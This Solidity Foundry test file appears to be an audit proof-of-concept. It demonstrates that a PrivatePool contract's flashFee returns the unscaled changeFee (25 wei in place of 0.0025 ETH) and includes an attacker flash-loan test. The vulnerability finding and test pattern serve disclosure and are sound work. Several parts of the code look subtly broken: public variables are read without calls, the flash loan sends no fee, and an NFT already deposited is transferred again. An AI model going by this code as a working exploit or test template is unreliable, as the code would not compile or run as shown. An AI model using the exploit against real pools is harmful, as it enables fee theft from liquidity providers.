// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {ERC721} from "solmate/tokens/ERC721.sol";
import {PrivatePool} from "../../src/PrivatePool.sol";
import {Factory} from "../../src/Factory.sol";
import {IERC3156FlashBorrower} from "openzeppelin/interfaces/IERC3156FlashLender.sol";

// Mock NFT contract for testing
contract MockNFT is ERC721 {
    constructor() ERC721("Mock NFT", "MNFT") {}
    
    function mint(address to, uint256 tokenId) public {
        _mint(to, tokenId);
    }
}

// Mock ERC20 token for testing
contract MockToken is ERC20 {
    constructor() ERC20("Mock Token", "MTK", 18) {}
    
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

// Flash borrower contract to test flash loans
contract FlashBorrower is IERC3156FlashBorrower {
    bool public flashLoanSucceeded;
    uint256 public flashFeePaid;
    address public poolAddress;
    
    function onFlashLoan(
        address initiator,
        address token,
        uint256 tokenId,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        poolAddress = msg.sender;
        flashFeePaid = fee;
        flashLoanSucceeded = true;
        
        // Return the required callback signature
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
    
    function reset() public {
        flashLoanSucceeded = false;
        flashFeePaid = 0;
        poolAddress = address(0);
    }
}

contract ExploitTest is Test {
    PrivatePool privatePool;
    Factory factory;
    MockNFT nft;
    MockToken token;
    FlashBorrower borrower;
    
    address private owner = address(0x1);
    address private attacker = address(0x2);
    
    event FlashFee(address indexed token, uint256 indexed tokenId, uint256 fee);
    
    function setUp() public {
        // Deploy mock contracts
        nft = new MockNFT();
        token = new MockToken();
        borrower = new FlashBorrower();
        
        // Deploy factory
        factory = new Factory(address(0), address(0), address(0));
        
        // Deploy PrivatePool
        privatePool = new PrivatePool(address(factory), address(0), address(0));
        
        // Fund accounts
        vm.deal(owner, 100 ether);
        vm.deal(attacker, 10 ether);
        
        // Mint NFTs to owner
        vm.startPrank(owner);
        nft.mint(owner, 1);
        nft.mint(owner, 2);
        nft.mint(owner, 3);
        
        // Approve NFTs to pool
        nft.setApprovalForAll(address(privatePool), true);
        
        // Initialize pool with ETH as base token
        privatePool.initialize(
            address(0), // ETH as base token
            address(nft),
            1 ether, // virtualBaseTokenReserves
            3 ether, // virtualNftReserves
            25, // changeFee = 25 (should be 0.0025 ETH for changes)
            100, // feeRate = 1%
            bytes32(0), // merkleRoot
            false, // useStolenNftOracle
            false // payRoyalties
        );
        
        // Deposit NFTs into pool
        uint256[] memory tokenIds = new uint256[](3);
        tokenIds[0] = 1;
        tokenIds[1] = 2;
        tokenIds[2] = 3;
        privatePool.deposit(tokenIds, 0);
        
        vm.stopPrank();
    }
    
    function testFlashFeeVulnerability() public {
        // The vulnerability: flashFee returns changeFee directly without scaling
        // changeFee is 25, which should be 0.0025 ETH (25 * 10^14 wei)
        // But flashFee returns just 25 wei
        
        uint256 expectedFlashFee = 25; // What the contract actually charges
        uint256 correctFlashFee = 25 * 10**14; // What it should charge (0.0025 ETH)
        
        // Get the actual flash fee from the contract
        uint256 actualFlashFee = privatePool.flashFee(address(nft), 1);
        
        console.log("ChangeFee value:", privatePool.changeFee());
        console.log("Actual flash fee (wei):", actualFlashFee);
        console.log("Expected flash fee (wei):", expectedFlashFee);
        console.log("Correct flash fee should be (wei):", correctFlashFee);
        console.log("Difference (wei):", correctFlashFee - actualFlashFee);
        
        // Verify the vulnerability
        assertEq(actualFlashFee, expectedFlashFee, "Flash fee should equal changeFee directly");
        assertTrue(actualFlashFee < correctFlashFee, "Flash fee is much lower than it should be");
        
        // Calculate how much cheaper the flash loan is
        uint256 discountPercentage = (correctFlashFee - actualFlashFee) * 100 / correctFlashFee;
        console.log("Discount percentage:", discountPercentage);
        assertTrue(discountPercentage > 99, "Flash loan is >99% cheaper than intended");
    }
    
    function testExploitFlashLoan() public {
        // Demonstrate the exploit by performing a flash loan
        vm.startPrank(attacker);
        
        // Fund the borrower with enough ETH to pay the tiny flash fee
        vm.deal(address(borrower), 1 ether);
        
        // Check that the NFT is available for flash loan
        assertTrue(privatePool.availableForFlashLoan(address(nft), 1), "NFT should be available for flash loan");
        
        // Get the flash fee
        uint256 flashFee = privatePool.flashFee(address(nft), 1);
        console.log("Flash fee to pay:", flashFee, "wei");
        
        // Perform the flash loan
        borrower.reset();
        privatePool.flashLoan(
            borrower,
            address(nft),
            1,
            ""
        );
        
        // Verify the flash loan succeeded
        assertTrue(borrower.flashLoanSucceeded, "Flash loan should succeed");
        assertEq(borrower.flashFeePaid, flashFee, "Flash fee paid should match");
        
        // The attacker only paid 25 wei instead of 0.0025 ETH
        assertTrue(flashFee < 0.0025 ether, "Flash fee is much lower than intended");
        
        vm.stopPrank();
    }
    
    function testChangeFeeVsFlashFeeDiscrepancy() public {
        // Compare change fee calculation vs flash fee calculation
        
        // Calculate change fee for 1 NFT (should be 0.0025 ETH)
        (uint256 changeFeeAmount,) = privatePool.changeFeeQuote(1 ether);
        
        // Get flash fee for 1 NFT
        uint256 flashFeeAmount = privatePool.flashFee(address(nft), 1);
        
        console.log("Change fee for 1 NFT (wei):", changeFeeAmount);
        console.log("Flash fee for 1 NFT (wei):", flashFeeAmount);
        console.log("Ratio (change/flash):", changeFeeAmount / flashFeeAmount);
        
        // The change fee should be much higher than the flash fee
        assertTrue(changeFeeAmount > flashFeeAmount * 10**13, "Change fee should be orders of magnitude higher");
        
        // Specifically, with changeFee = 25:
        // - Change fee = 25 * 10^(18-4) = 25 * 10^14 = 2.5 * 10^15 wei = 0.0025 ETH
        // - Flash fee = 25 wei
        // Ratio should be 10^14
        assertEq(changeFeeAmount / flashFeeAmount, 10**14, "Ratio should be 10^14");
    }
    
    function testFlashLoanWithERC20BaseToken() public {
        // Test with ERC20 base token to show the issue persists
        
        // Deploy new pool with ERC20 as base token
        PrivatePool erc20Pool = new PrivatePool(address(factory), address(0), address(0));
        
        vm.startPrank(owner);
        
        // Initialize pool with ERC20 token as base
        erc20Pool.initialize(
            address(token),
            address(nft),
            1e18, // virtualBaseTokenReserves
            3e18, // virtualNftReserves
            25, // changeFee = 25 (should be 0.0025 tokens for changes)
            100, // feeRate = 1%
            bytes32(0), // merkleRoot
            false, // useStolenNftOracle
            false // payRoyalties
        );
        
        // Deposit NFTs
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 1;
        nft.safeTransferFrom(owner, address(erc20Pool), 1);
        
        vm.stopPrank();
        
        // Calculate expected fees
        (uint256 changeFeeAmount,) = erc20Pool.changeFeeQuote(1e18);
        uint256 flashFeeAmount = erc20Pool.flashFee(address(nft), 1);
        
        console.log("ERC20 Pool - Change fee:", changeFeeAmount);
        console.log("ERC20 Pool - Flash fee:", flashFeeAmount);
        
        // The same discrepancy exists
        assertTrue(changeFeeAmount > flashFeeAmount * 10**13, "Change fee should be orders of magnitude higher");
    }
}